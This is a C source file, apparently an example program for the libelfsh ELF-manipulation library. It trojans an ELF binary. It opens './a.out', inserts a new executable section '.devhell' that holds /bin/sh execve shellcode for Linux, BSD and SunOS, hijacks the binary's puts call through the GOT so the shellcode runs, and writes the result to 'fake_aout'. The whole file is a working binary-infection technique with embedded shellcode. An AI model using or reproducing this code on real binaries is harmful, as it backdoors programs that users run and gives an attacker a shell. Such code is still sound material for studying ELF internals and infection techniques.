/*
** sht_extend.c
** 
** Started on  Sun Mar 17 05:57:23 2002 mayhem
** Last update Mon May 19 13:11:32 2003 mayhem
*/
#include "libelfsh.h"

#define         TROJANED_FILE   "./a.out"
#define         OUTPUT_FILE     "./fake_aout"



/* the first execve + exit shellcode I found in my tree, not a very short one ;) */
#if defined(__linux__)

char sc[] = 
"\x31\xd2\x52\x68"
"\x6E\x2f\x73\x68"
"\x68\x2f\x2f\x62"
"\x69\x89\xe3\x52"
"\x53\x89\xe1\x8D"
"\x42\x0b\xcd\x80"
"\x31\xC0\x40\xcd\x80";

#elif defined(__NetBSD__) || defined(__OpenBSD__) || defined(__FreeBSD__)

char    sc[] = 
"\xeb\x22"                      /* jmp end                      */
"\x5e"                          /* beg: pop %esi                */
"\x31\xc0"                      /* xorl %eax, %eax              */
"\x88\x46\x07"                  /* movb %al ,  0x7(%esi)        */
"\x89\x76\x08"                  /* movl %esi,  0x8(%esi)        */
"\x89\x46\x0c"                  /* movl %eax,  0xc(%esi)        */
"\x8d\x56\x0c"                  /* leal 0xc(%esi), %edx         */
"\x8d\x4e\x08"                  /* leal 0x8(%esi), %ecx         */
"\x52"                          /* push %edx                    */
"\x51"                          /* push %ecx                    */
"\x56"                          /* push %esi                    */
"\x50"                          /* push %eax                    */
"\xb0\x3b"                      /* movb $0x3b, %al              */
"\xcd\x80"                      /* int  $0x80                   */
"\x31\xdb"                      /* xorl %ebx, %ebx              */
"\x89\xd8"                      /* movl %ebx, %eax              */
"\xfe\xc0"                      /* inc  %al                     */
"\xcd\x80"                      /* int  $0x80                   */
"\xe8\xd9\xff\xff\xff"          /* end: call beg                */
"\x2f\x62\x69\x6e\x2f\x73\x68";  /* "/bin/sh"                    */

#elif defined(sun)

char sc[] =
"\x2d\x0b\xd8\x9a\xac\x15\xa1\x6e"
"\x2b\x0b\xda\xdc\xae\x15\x63\x68"
"\x90\x0b\x80\x0e\x92\x03\xa0\x0c"
"\x94\x10\x20\x10\x94\x22\xa0\x10"
"\x9c\x03\xa0\x14"
"\xec\x3b\xbf\xec\xc0\x23\xbf\xf4\xdc\x23\xbf\xf8\xc0\x23\xbf\xfc"
"\x82\x10\x20\x3b\x91\xd0\x20\x08\x90\x1b\xc0\x0f\x82\x10\x20\x01"
"\x91\xd0\x20\x08" ;

#endif



/* test for non-mapped data */
char	*str = "stop looking at me ! \n";



/* Here we map the shellcode in a newly inserted mapped section (.devhell) and modify the entry point */
int		main(int argc, char **argv)
{
  elfshobj_t	*file;
  elfsh_Shdr	hdr;
  elfsh_Shdr	unmapped_hdr;
  elfshsect_t	*new;
  elfshsect_t	*unmapped_new;
  int		ret;
  elfsh_Sym     *puts_troj;

  file = elfsh_map_obj(TROJANED_FILE);
  if (!file)
    goto err;

  printf(" => Injection section and adding section header table entry ... \n");
  new = elfsh_create_section(".devhell");
  if (!new)
    goto err;

  /* Create a section header for the mapped section */
  hdr = elfsh_create_shdr(0, SHT_PROGBITS, SHF_EXECINSTR | SHF_ALLOC, 0, 0, sizeof(sc), 0, 0, 0, 0);

  /* Insert the section */
  if (elfsh_insert_mapped_section(file, new, hdr, sc, ELFSH_DATA_INJECTION) < 0)
    goto err;

  /* Retreive it again since the file offset and the vaddr may have been updated during insertion */
  new = elfsh_get_section_by_name(file, ".devhell", NULL, NULL, NULL);
  if (!new)
    goto err;

  /* Hijack puts */
  elfsh_hijack_function_by_name(file, ELFSH_HIJACK_TYPE_GOT, 
				"puts", new->shdr->sh_addr);

  /* and finally save the object */
  ret = elfsh_save_obj(file, OUTPUT_FILE);

  printf("Relinking *OK*\n");
  return (0);
 
 err:
  elfsh_error();
  return (-1);
}







